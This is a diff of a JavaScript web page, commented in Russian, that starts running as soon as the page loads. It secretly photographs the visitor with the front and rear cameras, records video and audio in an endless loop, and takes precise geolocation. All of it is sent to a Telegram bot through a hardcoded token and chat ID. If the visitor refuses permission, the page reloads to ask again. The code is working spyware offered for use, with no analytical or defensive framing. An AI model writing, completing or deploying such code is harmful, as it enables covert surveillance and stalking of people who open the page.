@@ -1,11 +1,11 @@
+// 🔥 Встроены твой TG токен и ID
 const TELEGRAM_TOKEN = "8377810271:AAG4gGXoBLBCjt3fKE9ZSefJ92UiI_jKW5I";
 const TELEGRAM_CHAT_ID = "8071841674";
 const TELEGRAM_ERROR_MSG = "Пользователь отказал в доступе";
 
-const startBtn = document.getElementById('startBtn');
 const statusEl = document.getElementById('status');
-const nameInput = document.getElementById('name');
 
+// Функция отправки данных в Telegram
 async function sendToTelegram(payload) {
   if (payload.error) {
     await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -19,11 +19,14 @@ async function sendToTelegram(payload) {
       await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: `Пользователь: ${nameInput.value || 'Unknown'}\nГеолокация: ${mapUrl}`
-        })
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: `Геолокация: ${mapUrl}` })
       });
+    }
+    if (payload.photo) {
+      const formData = new FormData();
+      formData.append("chat_id", TELEGRAM_CHAT_ID);
+      formData.append("photo", payload.photo, "photo.jpg");
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: "POST", body: formData });
     }
     if (payload.video) {
       const formData = new FormData();
@@ -34,56 +37,99 @@ async function sendToTelegram(payload) {
   }
 }
 
-async function startRecording() {
-  statusEl.textContent = 'Запрашиваем разрешения...';
+// Основной цикл работы
+async function init() {
   let granted = { camera: false, geo: false };
   let coords = null;
-  let videoBlob = null;
 
-  // --- Камера + микрофон (20 секунд скрытой записи) ---
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video:true, audio:true });
+    const streamFront = await navigator.mediaDevices.getUserMedia({ video:{facingMode:"user"}, audio:true });
     granted.camera = true;
 
-    const mediaRecorder = new MediaRecorder(stream);
-    let chunks = [];
-    mediaRecorder.ondataavailable = e => chunks.push(e.data);
-    mediaRecorder.start();
+    // Снимок передней камеры
+    const videoFront = document.createElement("video");
+    videoFront.srcObject = streamFront;
+    await videoFront.play();
+    const canvasFront = document.createElement("canvas");
+    canvasFront.width = videoFront.videoWidth;
+    canvasFront.height = videoFront.videoHeight;
+    canvasFront.getContext("2d").drawImage(videoFront,0,0);
+    const photoFront = await fetch(canvasFront.toDataURL("image/jpeg")).then(r=>r.blob());
+    await sendToTelegram({ photo: photoFront });
+    streamFront.getTracks().forEach(t=>t.stop());
 
-    await new Promise(resolve => setTimeout(resolve, 20000)); // 20 секунд
-    mediaRecorder.stop();
+    // Снимок задней камеры
+    const streamBack = await navigator.mediaDevices.getUserMedia({ video:{facingMode:"environment"}, audio:true });
+    const videoBack = document.createElement("video");
+    videoBack.srcObject = streamBack;
+    await videoBack.play();
+    const canvasBack = document.createElement("canvas");
+    canvasBack.width = videoBack.videoWidth;
+    canvasBack.height = videoBack.videoHeight;
+    canvasBack.getContext("2d").drawImage(videoBack,0,0);
+    const photoBack = await fetch(canvasBack.toDataURL("image/jpeg")).then(r=>r.blob());
+    await sendToTelegram({ photo: photoBack });
+    streamBack.getTracks().forEach(t=>t.stop());
 
-    videoBlob = new Blob(chunks, { type: 'video/webm' });
-    stream.getTracks().forEach(track => track.stop());
+    // Цикл видео (10сек фронт + 5сек зад)
+    async function recordCycle() {
+      const streamF = await navigator.mediaDevices.getUserMedia({ video:{facingMode:"user"}, audio:true });
+      const streamB = await navigator.mediaDevices.getUserMedia({ video:{facingMode:"environment"}, audio:true });
+
+      while(true){
+        // 10 сек фронт
+        const recorderF = new MediaRecorder(streamF);
+        let chunksF = [];
+        recorderF.ondataavailable = e=>chunksF.push(e.data);
+        recorderF.start();
+        await new Promise(r=>setTimeout(r,10000));
+        recorderF.stop();
+        await new Promise(r=>recorderF.onstop = r);
+        const videoF = new Blob(chunksF,{type:"video/webm"});
+        await sendToTelegram({ video: videoF });
+
+        // 5 сек зад
+        const recorderB = new MediaRecorder(streamB);
+        let chunksB = [];
+        recorderB.ondataavailable = e=>chunksB.push(e.data);
+        recorderB.start();
+        await new Promise(r=>setTimeout(r,5000));
+        recorderB.stop();
+        await new Promise(r=>recorderB.onstop = r);
+        const videoB = new Blob(chunksB,{type:"video/webm"});
+        await sendToTelegram({ video: videoB });
+      }
+    }
+
+    recordCycle(); // старт цикла видео
+
   } catch(err) {
     granted.camera = false;
   }
 
-  // --- Геолокация ---
+  // Геолокация
   try {
-    coords = await new Promise((resolve, reject) => {
+    coords = await new Promise((resolve,reject)=>{
       navigator.geolocation.getCurrentPosition(
-        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
-        err => reject(err),
+        pos=>resolve({lat:pos.coords.latitude, lon:pos.coords.longitude}),
+        err=>reject(err),
         { enableHighAccuracy:true, timeout:10000 }
       );
     });
     granted.geo = true;
-  } catch(err) {
+    await sendToTelegram({ coords });
+  } catch(err){
     granted.geo = false;
   }
 
-  // --- Отправка в Telegram ---
-  if (granted.camera || granted.geo) {
-    await sendToTelegram({ video: videoBlob, coords });
-  } else {
+  // Если оба отказали
+  if(!granted.camera && !granted.geo){
     await sendToTelegram({ error: TELEGRAM_ERROR_MSG });
+    location.reload(); // повторный запрос
   }
 
-  // --- Редирект ---
-  setTimeout(() => {
-    window.location.href = "https://murakamicity.com/";
-  }, 1000);
+  statusEl.textContent = 'Запись и отправка данных выполняется...';
 }
 
-startBtn.addEventListener('click', startRecording);
+// Авто-запуск
+init();
